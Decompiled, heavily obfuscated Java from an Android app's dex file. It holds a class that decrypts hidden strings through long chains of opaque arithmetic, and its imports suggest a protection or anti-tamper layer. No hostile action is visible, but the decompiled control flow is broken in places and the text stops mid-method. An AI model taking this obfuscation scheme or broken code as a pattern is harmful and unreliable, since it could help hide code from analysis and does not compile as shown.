package F0;

import android.R;
import android.app.ActivityManager;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ActivityInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ProviderInfo;
import android.content.pm.ResolveInfo;
import android.content.pm.ServiceInfo;
import android.net.Uri;
import android.text.TextUtils;
import androidx.security.BNatives;
import com.google.android.gms.fido.fido2.api.common.UserVerificationMethods;
import java.io.File;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ThreadLocalRandom;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import org.apache.tika.fork.ForkServer;

/* renamed from: F0.c0, reason: case insensitive filesystem */
/* loaded from: classes.dex */
public final class C0017c0 extends Y2 {

    /* renamed from: h, reason: collision with root package name */
    public final C0065o0 f475h;
    public volatile C0031f2 i;

    static {
        byte[] bArr = {-93, 78, 98, 115, -14, 12, 104, 72};
        byte[] bArr2 = new byte[8];
        bArr2[0] = -51;
        long j2 = 1392422004;
        long j3 = ~C0017c0.class.getName().length();
        long j4 = (((((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + (((((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + 6148914691236517205L;
        long j5 = (j4 >>> 48) & 43690;
        long j6 = ((j5 >>> 2) | (j5 >>> 1)) & 858993459;
        long j7 = ((j6 >>> 2) | j6) & 252645135;
        long j8 = (j4 >>> 32) & 43690;
        long j9 = ((j8 >>> 2) | (j8 >>> 1)) & 858993459;
        long j10 = ((j9 >>> 2) | j9) & 252645135;
        long j11 = ((((j10 >>> 4) | j10) & 16711935) << 16) | ((((j7 >>> 4) | j7) & 16711935) << 24);
        long j12 = (j4 >>> 16) & 43690;
        long j13 = ((j12 >>> 2) | (j12 >>> 1)) & 858993459;
        long j14 = ((j13 >>> 2) | j13) & 252645135;
        long j15 = j4 & 43690;
        long j16 = ((j15 >>> 2) | (j15 >>> 1)) & 858993459;
        long j17 = ((j16 >>> 2) | j16) & 252645135;
        long j18 = 11022464;
        long j19 = (int) ((((j17 >>> 4) | j17) & 16711935) | ((((j14 >>> 4) | j14) & 16711935) << 8) | j11);
        long j20 = ((((((((j18 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j18 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j18 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j18 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) + (((((((((j19 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j19 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j19 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j19 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)));
        long j21 = (j20 >>> 48) & 43690;
        long j22 = ((j21 >>> 2) | (j21 >>> 1)) & 858993459;
        long j23 = ((j22 >>> 2) | j22) & 252645135;
        long j24 = (j20 >>> 32) & 43690;
        long j25 = ((j24 >>> 2) | (j24 >>> 1)) & 858993459;
        long j26 = ((j25 >>> 2) | j25) & 252645135;
        long j27 = ((((j26 >>> 4) | j26) & 16711935) << 16) | ((((j23 >>> 4) | j23) & 16711935) << 24);
        long j28 = (j20 >>> 16) & 43690;
        long j29 = ((j28 >>> 2) | (j28 >>> 1)) & 858993459;
        long j30 = ((j29 >>> 2) | j29) & 252645135;
        long j31 = ((((j30 >>> 4) | j30) & 16711935) << 8) + j27;
        long j32 = j20 & 43690;
        long j33 = ((j32 >>> 2) | (j32 >>> 1)) & 858993459;
        long j34 = (j33 | (j33 >>> 2)) & 252645135;
        long j35 = -1877998584;
        long length = C0017c0.class.getName().length() & (-2147479416);
        long j36 = (((((((((j35 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j35 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j35 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j35 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + ((((((((length >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((length >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((length >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((length & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) + 6148914691236517205L;
        long j37 = (j36 >>> 48) & 43690;
        long j38 = ((j37 >>> 2) | (j37 >>> 1)) & 858993459;
        long j39 = ((j38 >>> 2) | j38) & 252645135;
        long j40 = (j36 >>> 32) & 43690;
        long j41 = ((j40 >>> 2) | (j40 >>> 1)) & 858993459;
        long j42 = ((j41 >>> 2) | j41) & 252645135;
        long j43 = ((((j42 >>> 4) | j42) & 16711935) << 16) | ((((j39 >>> 4) | j39) & 16711935) << 24);
        long j44 = (j36 >>> 16) & 43690;
        long j45 = ((j44 >>> 2) | (j44 >>> 1)) & 858993459;
        long j46 = ((j45 >>> 2) | j45) & 252645135;
        long j47 = j36 & 43690;
        long j48 = ((j47 >>> 2) | (j47 >>> 1)) & 858993459;
        long j49 = ((j48 >>> 2) | j48) & 252645135;
        bArr2[(((int) (((j34 | (j34 >>> 4)) & 16711935) | j31)) + ((int) ((((j49 >>> 4) | j49) & 16711935) | (((((j46 >>> 4) | j46) & 16711935) << 8) | j43)))) ^ (-1866976119)] = -86;
        bArr2[2] = ((((~C0017c0.class.getName().length()) | (-1451354418)) & 147851308) + ((C0017c0.class.getName().length() & (-2139027422)) | (-2080268286))) ^ (-1932416910);
        bArr2[3] = -121;
        bArr2[4] = -97;
        bArr2[5] = -66;
        bArr2[6] = -42;
        bArr2[7] = -110;
        k(bArr, bArr2);
        Charset charset = StandardCharsets.UTF_8;
        new String(bArr, charset).intern();
        byte[] bArr3 = {-20, 50, -34, 8, -92, -110, -47, -29, -127, 107, -109, -36, 58, -104, -105, -73, -41, 119, 82, -48, -75, -78, -8, 117, -62, 54, -84, -54};
        byte[] bArr4 = new byte[28];
        bArr4[0] = 42;
        bArr4[1] = -78;
        bArr4[2] = 118;
        bArr4[3] = 0;
        bArr4[4] = 13;
        bArr4[5] = -6;
        bArr4[6] = -59;
        bArr4[7] = 100;
        bArr4[8] = 33;
        bArr4[9] = -60;
        bArr4[10] = -54;
        bArr4[11] = -77;
        bArr4[12] = -64;
        bArr4[13] = -97;
        bArr4[14] = 71;
        int i = ((~C0017c0.class.getName().length()) | 279439042) & 1073791170;
        int length2 = (C0017c0.class.getName().length() & 1082393601) | 77857793;
        int i3 = -i;
        int i4 = i3 | length2;
        bArr4[((i4 - (i3 * 2)) + ((i3 ^ length2) ^ i4)) ^ 1151648972] = 12;
        bArr4[16] = 111;
        bArr4[17] = -125;
        bArr4[18] = 120;
        int i5 = ((~C0017c0.class.getName().length()) | 254318374) & 1275593731;
        long j50 = 1075838977;
        long length3 = C0017c0.class.getName().length();
        long j51 = ((((((((j50 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j50 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j50 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j50 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (((((((((length3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((length3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((length3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((length3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)));
        long j52 = (j51 >>> 48) & 43690;
        long j53 = ((j52 >>> 2) | (j52 >>> 1)) & 858993459;
        long j54 = ((j53 >>> 2) | j53) & 252645135;
        long j55 = (j51 >>> 32) & 43690;
        long j56 = ((j55 >>> 2) | (j55 >>> 1)) & 858993459;
        long j57 = ((j56 >>> 2) | j56) & 252645135;
        long j58 = ((((j57 >>> 4) | j57) & 16711935) << 16) | ((((j54 >>> 4) | j54) & 16711935) << 24);
        long j59 = (j51 >>> 16) & 43690;
        long j60 = ((j59 >>> 2) | (j59 >>> 1)) & 858993459;
        long j61 = ((j60 >>> 2) | j60) & 252645135;
        long j62 = ((((j61 >>> 4) | j61) & 16711935) << 8) + j58;
        long j63 = j51 & 43690;
        long j64 = ((j63 >>> 2) | (j63 >>> 1)) & 858993459;
        long j65 = (j64 | (j64 >>> 2)) & 252645135;
        int i6 = i5 + (((int) (((j65 | (j65 >>> 4)) & 16711935) | j62)) | 10657796);
        long j66 = 1286251540;
        long j67 = i6;
        long j68 = ((((((((j66 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j66 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j66 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j66 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) + ((((((((j67 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j67 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j67 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j67 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
        long j69 = (j68 >>> 48) & 21845;
        long j70 = ((j69 >>> 1) | j69) & 858993459;
        long j71 = ((j70 >>> 2) | j70) & 252645135;
        long j72 = (j68 >>> 32) & 21845;
        long j73 = ((j72 >>> 1) | j72) & 858993459;
        long j74 = ((j73 >>> 2) | j73) & 252645135;
        long j75 = ((((j74 >>> 4) | j74) & 16711935) << 16) + ((((j71 >>> 4) | j71) & 16711935) << 24);
        long j76 = (j68 >>> 16) & 21845;
        long j77 = ((j76 >>> 1) | j76) & 858993459;
        long j78 = ((j77 >>> 2) | j77) & 252645135;
        long j79 = j68 & 21845;
        long j80 = ((j79 >>> 1) | j79) & 858993459;
        long j81 = ((j80 >>> 2) | j80) & 252645135;
        bArr4[(int) ((((j81 >>> 4) | j81) & 16711935) + (((((j78 >>> 4) | j78) & 16711935) << 8) | j75))] = -122;
        bArr4[20] = 22;
        bArr4[21] = 121;
        bArr4[22] = 120;
        long j82 = 1258841120;
        long j83 = (~C0017c0.class.getName().length()) | 1930927982;
        long j84 = ((((((((j82 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j82 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j82 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j82 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + ((((((((j83 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j83 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j83 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j83 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
        long j85 = (j84 >>> 48) & 43690;
        long j86 = ((j85 >>> 2) | (j85 >>> 1)) & 858993459;
        long j87 = ((j86 >>> 2) | j86) & 252645135;
        long j88 = (j84 >>> 32) & 43690;
        long j89 = ((j88 >>> 2) | (j88 >>> 1)) & 858993459;
        long j90 = ((j89 >>> 2) | j89) & 252645135;
        long j91 = ((((j90 >>> 4) | j90) & 16711935) << 16) | ((((j87 >>> 4) | j87) & 16711935) << 24);
        long j92 = (j84 >>> 16) & 43690;
        long j93 = ((j92 >>> 2) | (j92 >>> 1)) & 858993459;
        long j94 = ((j93 >>> 2) | j93) & 252645135;
        long j95 = j84 & 43690;
        long j96 = ((j95 >>> 2) | (j95 >>> 1)) & 858993459;
        long j97 = ((j96 >>> 2) | j96) & 252645135;
        bArr4[1806361653 ^ ((((C0017c0.class.getName().length() & 671670274) | 547520514) - (~((int) ((((j97 >>> 4) | j97) & 16711935) | (((((j94 >>> 4) | j94) & 16711935) << 8) | j91))))) - 1)] = -79;
        bArr4[24] = -85;
        bArr4[25] = -14;
        bArr4[26] = -113;
        bArr4[27] = 4;
        k(bArr3, bArr4);
        new String(bArr3, charset).intern();
        byte[] bArr5 = new byte[10];
        bArr5[0] = -100;
        bArr5[1] = -121;
        bArr5[2] = 107;
        bArr5[3] = -28;
        bArr5[4] = -93;
        bArr5[5] = -83;
        bArr5[6] = -53;
        bArr5[((((~C0017c0.class.getName().length()) | 1336881244) & 76757056) + ((C0017c0.class.getName().length() & 18352128) | (-485982208))) ^ (-409225145)] = 12;
        bArr5[8] = -107;
        bArr5[9] = -35;
        int i7 = ((~C0017c0.class.getName().length()) | 2098711838) & (-779931136);
        int length4 = C0017c0.class.getName().length();
        long j98 = 5800000;
        long j99 = ((-2133806592) + length4) - (length4 | (-2133806592));
        long j100 = (((((((((j98 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j98 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j98 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j98 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + (((((((((j99 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j99 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j99 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j99 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + 6148914691236517205L;
        long j101 = (j100 >>> 48) & 43690;
        long j102 = ((j101 >>> 2) | (j101 >>> 1)) & 858993459;
        long j103 = (j102 | (j102 >>> 2)) & 252645135;
        long j104 = (j100 >>> 32) & 43690;
        long j105 = ((j104 >>> 2) | (j104 >>> 1)) & 858993459;
        long j106 = (j105 | (j105 >>> 2)) & 252645135;
        long j107 = (((j106 | (j106 >>> 4)) & 16711935) << 16) + (((j103 | (j103 >>> 4)) & 16711935) << 24);
        long j108 = (j100 >>> 16) & 43690;
        long j109 = ((j108 >>> 2) | (j108 >>> 1)) & 858993459;
        long j110 = (j109 | (j109 >>> 2)) & 252645135;
        long j111 = j100 & 43690;
        long j112 = ((j111 >>> 2) | (j111 >>> 1)) & 858993459;
        long j113 = (j112 | (j112 >>> 2)) & 252645135;
        k(bArr5, new byte[]{17, -77, -6, 35, -88, -126, -97, (-774131130) ^ (i7 + ((int) (((j113 | (j113 >>> 4)) & 16711935) | ((((j110 | (j110 >>> 4)) & 16711935) << 8) | j107)))), -59, 116});
        new String(bArr5, charset).intern();
    }

    public C0017c0(C0093v1 c0093v1, C0021d0 c0021d0, C0054l1 c0054l1, C0065o0 c0065o0) {
        super(c0093v1, c0021d0, c0054l1);
        c0054l1.f573a.getClass();
        int i = AbstractC0041i0.f535a;
        C0043i2 c0043i2 = ((C0051k2) ((Z1) c0093v1.f697d)).f558b;
        this.f475h = c0065o0;
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:3:0x0049. Please report as an issue. */
    public static void B(byte[] bArr, byte[] bArr2) {
        int i;
        byte[] bArr3 = null;
        int i3 = 0;
        int i4 = 0;
        int i5 = 0;
        int i6 = -585497720;
        byte[] bArr4 = null;
        while (true) {
            int i7 = ((i6 & 16777216) * (i6 | 16777216)) + ((i6 & (-16777217)) * ((~i6) & 16777216));
            int i8 = i6 >>> 8;
            int i9 = ~((((~i8) | (-238348293)) | i7) - ((i8 & (-238348293)) | i7));
            int i10 = (-1081514022) - ((i9 & 2) | ((-10362931) - i9));
            int a2 = E1.a(i10 | (-428181225), i10, -428181225);
            int i11 = 2100390411;
            int i12 = -897645243;
            boolean z3 = true;
            switch (a2) {
                case -1819084085:
                    int length = bArr3.length;
                    int i13 = 0 - i3;
                    int length2 = bArr3.length;
                    int i14 = 0 - i13;
                    byte b4 = bArr3[(length2 & (~i14)) - ((~length2) & i14)];
                    int length3 = bArr3.length;
                    byte b5 = bArr4[((length3 | i13) - (((-1678010279) & (~i13)) & length3)) + ((i13 | (-1678010279)) & length3)];
                    bArr3[((length | i13) * 2) - (length ^ i13)] = (byte) (((byte) (((byte) (((byte) 2) * ((byte) (b5 | b4)))) - b5)) - b4);
                    i5 = 4 - ((5 - i3) | (i3 & 2));
                    int i15 = ((i3 > 2 ? 1 : (i3 == 2 ? 0 : -1)) >>> 31) & 1;
                    if (i15 == 0) {
                        i11 = -897645243;
                    }
                    if (i15 != 0) {
                        i6 = i11;
                    } else {
                        i6 = -2079636786;
                    }
                case -1350640889:
                    int length4 = bArr.length;
                    int length5 = 0 - (bArr.length % 4);
                    if (((length4 | length5) - ((942778902 & (~length5)) & length4)) + ((length5 | 942778902) & length4) <= 0) {
                        z3 = false;
                    }
                    if (z3) {
                        i = -897645243;
                    } else {
                        i = 1251644638;
                    }
                    if (z3) {
                        i6 = -1469476344;
                    } else {
                        i6 = i;
                    }
                    bArr4 = bArr2;
                    bArr3 = bArr;
                    i4 = 0;
                case -477594107:
                    int length6 = bArr3.length;
                    int i16 = 0 - i3;
                    int i17 = ((length6 | i16) - (((-515406864) & (~i16)) & length6)) + ((i16 | (-515406864)) & length6);
                    byte b6 = bArr4[i17];
                    int length7 = bArr3.length;
                    byte b7 = bArr4[((i16 | length7) * 2) - (length7 ^ i16)];
                    int i18 = ((byte) 0) - b6;
                    int i19 = i18 | b7;
                    bArr4[i17] = (byte) (((byte) (((byte) i19) - ((byte) (((byte) 2) * ((byte) i18))))) + ((byte) ((b7 ^ i18) ^ i19)));
                    i6 = -1057239115;
                case 769572960:
                    break;
                case 783648904:
                    int i20 = i4 + 4 + (((-1) - i4) | (-4));
                    byte b8 = bArr4[i20];
                    int i21 = ((b8 & ForkServer.DONE) * (b8 | ForkServer.DONE)) + ((b8 & ForkServer.ERROR) * ((~b8) & 16777216));
                    int i22 = i4 & 2;
                    int i23 = (i4 + 2) - i22;
                    int i24 = bArr4[i23] & ForkServer.ERROR;
                    int i25 = i24 * ((~i24) & 65536);
                    int i26 = ~((i21 | ((~i25) | 467314697)) - ((i25 & 467314697) | i21));
                    int i27 = (i4 + 1) - (i4 & 1);
                    int i28 = bArr4[i27] & ForkServer.ERROR;
                    int i29 = i28 * ((~i28) & UserVerificationMethods.USER_VERIFY_HANDPRINT);
                    int i30 = ~((i26 | ((~i29) | 1328859631)) - ((i29 & 1328859631) | i26));
                    int i31 = bArr4[i4] & ForkServer.ERROR;
                    int a4 = S.a(i30, i31, 1, ((-1) - i30) | ((-1) - i31));
                    byte b9 = bArr3[i20];
                    int i32 = ((b9 & ForkServer.DONE) * (b9 | ForkServer.DONE)) + ((b9 & ForkServer.ERROR) * ((~b9) & 16777216));
                    int i33 = bArr3[i23] & ForkServer.ERROR;
                    int i34 = i33 * ((~i33) & 65536);
                    int a5 = j3.a((~i32) & 1647046022 & i34, i34, i32, (i32 | 1647046022) & i34);
                    int i35 = bArr3[i27] & ForkServer.ERROR;
                    int i36 = i35 * ((~i35) & UserVerificationMethods.USER_VERIFY_HANDPRINT);
                    int i37 = ~((a5 | ((~i36) | (-2059442874))) - ((i36 & (-2059442874)) | a5));
                    int i38 = bArr3[i4] & ForkServer.ERROR;
                    int a6 = S.a(i37, i38, 1, ((-1) - i37) | ((-1) - i38));
                    int i39 = a4 << ((a4 > Double.NaN ? 1 : (a4 == Double.NaN ? 0 : -1)) >>> 31);
                    int i40 = (i39 + a6) - ((i39 & a6) * 2);
                    bArr3[i4] = (byte) i40;
                    bArr3[i27] = (byte) (i40 >>> 8);
                    bArr3[i23] = (byte) (i40 >>> 16);
                    bArr3[i20] = (byte) (i40 >>> 24);
                    i4 = (-11) - (((-15) - i4) | i22);
                    int length8 = bArr3.length;
                    int a7 = AbstractC0044j.a(bArr3.length);
                    int i41 = ((i4 > (((length8 & (~a7)) * 2) - (length8 ^ a7)) ? 1 : (i4 == (((length8 & (~a7)) * 2) - (length8 ^ a7)) ? 0 : -1)) >>> 31) & 1;
                    if (i41 == 0) {
                        i12 = 1251644638;
                    }
                    if (i41 == 0) {
                        i6 = i12;
                    } else {
                        i6 = -1469476344;
                    }
                case 1758587480:
                    int length9 = bArr3.length;
                    int i42 = 0 - i5;
                    if ((bArr4[((length9 | i42) - ((822835569 & (~i42)) & length9)) + ((i42 | 822835569) & length9)] > Double.NaN ? 1 : (bArr4[((length9 | i42) - ((822835569 & (~i42)) & length9)) + ((i42 | 822835569) & length9)] == Double.NaN ? 0 : -1)) <= -1) {
                        i6 = -897645243;
                    } else {
                        i6 = -1057239115;
                    }
                    i3 = i5;
                case 2013813686:
                    i5 = bArr3.length % 4;
                    int i43 = ((i5 > 1 ? 1 : (i5 == 1 ? 0 : -1)) >>> 31) & 1;
                    if (i43 == 0) {
                        i11 = -897645243;
                    }
                    if (i43 != 0) {
                        i6 = i11;
                    } else {
                        i6 = -2079636786;
                    }
                default:
                    i6 = i12;
            }
            return;
        }
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:3:0x0135. Please report as an issue. */
    public static void k(byte[] bArr, byte[] bArr2) {
        int length;
        int i;
        int length2;
        int i3;
        int i4;
        int i5;
        int i6;
        int i7 = ~C0017c0.class.getName().length();
        int length3 = (((~(((C0017c0.class.getName().length() | 70245657) | i7) - (i7 | (C0017c0.class.getName().length() & (-70245658))))) & (-1979440632)) + ((C0017c0.class.getName().length() & 1074528264) | 1093142560)) ^ (-886298072);
        int f4 = AbstractC0008a.f(C0017c0.class, -1);
        int length4 = (((f4 | (-1789924155)) - ((21884101 | f4) ^ (-1811767295))) + (((C0017c0.class.getName().length() | 1811808253) - 1811808253) | 537399298)) ^ (-1274367997);
        int length5 = ((((~C0017c0.class.getName().length()) | (-576567005)) & 276971586) + ((C0017c0.class.getName().length() & 36928) | 1073844225)) ^ 1350815811;
        int length6 = ((((~C0017c0.class.getName().length()) | (-1157759625)) & 1755853004) + ((C0017c0.class.getName().length() & 1073973402) | (-2146202606))) ^ (-390349602);
        int i8 = ((~C0017c0.class.getName().length()) | (-529537184)) & 457019905;
        int length7 = C0017c0.class.getName().length();
        int i9 = (-1686268015) ^ ((((454038545 & length7) ^ (-2143287920)) + (length7 & 1040)) + i8);
        int length8 = ((((~C0017c0.class.getName().length()) | (-1064961)) + 689325073) + ((C0017c0.class.getName().length() & (-2112862208)) | (-2109732696))) ^ (-1420407624);
        int i10 = ((~C0017c0.class.getName().length()) | 91711000) & (-1070824876);
        int length9 = C0017c0.class.getName().length();
        int i11 = (i10 + (9457696 | ((length9 | (-1064779676)) - (length9 ^ (-1064779676))))) ^ 1492981618;
        short[] sArr = null;
        while (true) {
            switch (i11) {
                case -2143294076:
                    int i12 = ~C0017c0.class.getName().length();
                    if (length3 < length4) {
                        int length10 = (C0017c0.class.getName().length() & 268439810) | 285217280;
                        int i13 = -((i12 | (-1553600102)) - (((-1553600360) | i12) ^ 536887698));
                        i5 = (((~i13) & length10) * 2) - (i13 ^ length10);
                        i6 = -1524017045;
                        i11 = i6 ^ i5;
                    } else {
                        length = ((i12 | (-747233512)) & (-1862204400)) + ((C0017c0.class.getName().length() & 1073807362) | 1116733474);
                        i = -375509041;
                        i11 = length ^ i;
                    }
                case -2038999444:
                    int i14 = ~C0017c0.class.getName().length();
                    int length11 = (161497089 & (((((C0017c0.class.getName().length() & (~i14)) & 797295576) + 797295576) + i14) - ((C0017c0.class.getName().length() | i14) & 797295576))) + ((C0017c0.class.getName().length() & (-2145386455)) | (-2147483476));
                    int a2 = ((short) ((length5 << E1.a(length11 | (-1985986391), -1985986391, length11)) + sArr[((((~C0017c0.class.getName().length()) | (-1085986263)) & 1078327440) + ((C0017c0.class.getName().length() & 1612763792) | 674234944)) ^ 1752562386])) ^ (length5 + i9);
                    int i15 = ~C0017c0.class.getName().length();
                    int length12 = length5 >>> ((((~(((C0017c0.class.getName().length() | 626856794) | i15) - ((C0017c0.class.getName().length() & (-626856795)) | i15))) & 957405457) + ((C0017c0.class.getName().length() & 588787984) | 36185216)) ^ 993590676);
                    short s3 = sArr[((((~C0017c0.class.getName().length()) | 1248713193) & 826417528) + ((C0017c0.class.getName().length() & 822288912) | (-2138488320))) ^ (-1312070789)];
                    int i16 = -length12;
                    int i17 = i16 | s3;
                    int i18 = (i17 - (i16 * 2)) + ((i16 ^ s3) ^ i17);
                    int i19 = -B0.a(i18 | (~a2), i18 - a2);
                    length6 = (short) D.a(length6, 3, -(D1.a(length6, i19) | (i19 & 2)), 1);
                    int i20 = ((~C0017c0.class.getName().length()) | (-549847554)) + 1624126210;
                    int length13 = (C0017c0.class.getName().length() & 549848649) | 67175498;
                    length5 = (short) (length5 - ((((short) ((length6 << (1691301711 ^ ((length13 & i20) + (i20 | length13)))) + sArr[((((~C0017c0.class.getName().length()) | (-1005965450)) & 153223237) + ((C0017c0.class.getName().length() & 220201009) | 335544368)) ^ 488767605])) ^ (((i9 | length6) - ((C0017c0.class.getName().length() & (~length6)) & i9)) + ((C0017c0.class.getName().length() | length6) & i9))) ^ ((length6 >>> (((((~C0017c0.class.getName().length()) | (-30261291)) & (-1534000062)) + ((C0017c0.class.getName().length() & 8609814) | 2285588)) ^ (-1531714477))) + sArr[((((~C0017c0.class.getName().length()) | (-23496740)) & 827084804) + ((C0017c0.class.getName().length() & (-2117787632)) | (-2139021104))) ^ (-1311936299)])));
                    int i21 = ((~C0017c0.class.getName().length()) | (-412319609)) & (-1959782776);
                    int length14 = (C0017c0.class.getName().length() & 403838542) | 268582982;
                    int i22 = -i21;
                    int i23 = (((~i22) & length14) * 2) - (i22 ^ length14);
                    i9 = (short) U0.a(1691170566 & i23, (-1691170567) - i23, i9);
                    length8++;
                    length = (((~C0017c0.class.getName().length()) | (-961655275)) & 25184460) + ((C0017c0.class.getName().length() & 150995145) | 140771329);
                    i = 1965034008;
                    i11 = length ^ i;
                case -1809249287:
                    byte b4 = bArr[(((((~C0017c0.class.getName().length()) | 1233459797) & 125923146) + ((C0017c0.class.getName().length() & 774137098) | 674496513)) ^ 800419659) + length3];
                    int length15 = ((((~C0017c0.class.getName().length()) | (-7107622)) & 402932290) + ((C0017c0.class.getName().length() & 546586672) | 546340912)) ^ 949273229;
                    int length16 = ((C0017c0.class.getName().length() | length15) - (b4 | length15)) + I2.a(C0017c0.class, b4) + (C0017c0.class.getName().length() & length15);
                    int length17 = ((((~C0017c0.class.getName().length()) | (-81143879)) & 438583424) + ((C0017c0.class.getName().length() & 786435) | 8921603)) ^ 447505026;
